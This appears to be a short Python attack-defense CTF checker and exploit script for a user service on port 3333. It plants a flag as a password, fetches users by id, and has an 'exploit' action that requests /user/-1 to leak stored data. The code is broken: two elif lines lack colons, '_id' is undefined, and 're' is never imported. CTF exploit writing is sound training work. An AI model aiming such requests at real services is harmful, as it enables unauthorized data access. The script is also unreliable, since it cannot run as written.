#!/usr/bin/python3
import sys
import requests
sys.path.insert(0, "./lib")
from lib.decorators import cmd_args

@cmd_args
def run(action="put", ip=None, flag=None):
    if action == "put":
        req = requests.post(f"http://{ip}:3333/user", json={"name": "test", 'password': flag})
    elif action == "get"
        req = requests.get(f"http://{ip}:3333/user/{_id}")
    elif action == "exploit"
        req = requests.get(f"http://{ip}:3333/user/-1")
        data = re.search(r"([{\[].*?[}\]])$", req.text)
        if data:
            return 1
        return 0
    return req.text


print(run())

